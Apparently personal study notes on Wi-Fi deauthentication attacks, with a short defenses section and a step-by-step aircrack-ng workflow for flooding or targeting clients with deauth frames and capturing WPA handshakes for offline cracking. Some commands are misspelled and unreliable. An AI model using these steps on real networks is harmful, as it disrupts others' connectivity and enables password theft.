In Wi-Fi (802.11), a de-authentication frame is a type of management frame defined in the standard.

Legitimate purpose : AP or client can signal that a station is no longer authenticated or associated. 
- AP wants to drop a client
- Client want to leave

These frames are part of a normal Wi-Fi operation and are send -un-encrypted in WPA/WPA2 networks. 

**Anyone listening on the Wi-Fi channel can see and inject these frames if they are on the same channel**.
#### How it works ?
- The attacker sends a spoofed de-auth frames to a client(or multiple clients).
	Spoofed : The attacker fakes the source MAC address of the AP so the client thin it's legitimate AP telling to disconnect.
- The client receives the frame and disconnect from the AP.

> [!NOTE] Re-connect
> When client try to re-connect, it goes through a new 4-way handshake, which the attacker can capture for offline password cracking.

Key points,
- The attacker doesn't need to know the AP password.
- Only needs to be within Wi-Fi range and capable of injecting frames (requires Wi-Fi card in monitor/injection mode).
#### Mass de-auth attack
An attacker can target a single AP and flood all connected clients with de-auth frames. This causes all clients to drop and re-connect. 
Often called a "deauth flood".
Similar to a **DOS(denial-of-service)** attack.
#### Defenses against deauth 
1. 802.11w/ Protected Management Frames(PMF)
	Encrypts and authenticate some management frames, including deauth frames.
	Clients ignore spoofed frames from unauthorized sources.
2. Using VPNs/application layer security
	Even if Wi-Fi disconnects or reconnects, VPN traffic remains encrypted.

#### Mass de-auth workflow,
To target all clients, you can broadcast a deauth frame to the BSSID(AP MAC) without specifying individual client MACs. 

**Tools**,
- `airmon-ng` : Put wifi card to monitor mode
- `aireplay-ng` : injects deauth frames
- `airodump-ng` : Capture the resulting handshake.

**Steps**,
1. Go to monitor mode
```sh
sudo airmon-ng check kill
sudo airmon start wlan0
```

2. Find your AP BSSID and channel
```sh
sudo airodump-ng wlan0mon
```
- Look for the target BSSID(MAC) and Channel(CH)

3. Switch to the AP channel
```sh
sudo airodump-ng --channel <CH> --bssid <BSSID> wlan0mon
```
- Keep this running to capture the handshake frames.

4. Send mass deauth frames to all clients
```sh
sudo airplay-ng --deauth 10 -a <BSSID> wlan0mon
```
- `--deauth 10` : Send 10 deauth frames
- `-a` : Target BSSID(AP MAC)

Then you using the `airodump-ng` terminal from step 3, you can see **"`WPA handshake:<BSSID>`"** appear at the top when clients re-connect. 

You can save the captures if you use,
```sh
sudo airodump-ng --bssid <BSSID> --channel <CH> -w capture wlan0mon
```
Then use `.cap` file to offline crack with `aircrack-ng` or `hashcat`.

*****
Instead of broads casting(like in step 4), you can target a specific client.
```sh
sudo airodump-ng wlan0mon
```
Look for your AP row (SSID/BSSID/CH) and below it the **STATION** entries. You’ll see client MACs listed under `STATION` associated with the AP BSSID.

If you want to focus on one AP to make reading easier:
```sh
sudo airodump-ng --bssid <BSSID> --channel <CH> wlan0mon
```

Then target a single client,
```sh
sudo aireplay-ng --deauth 10 -a 12:34:56:78:9A:BC -c AA:BB:CC:DD:EE:FF wlan0mon
```
- `-c` : Target client's MAC
- If use set `--deauth 0`, it will run continuously until you stop.
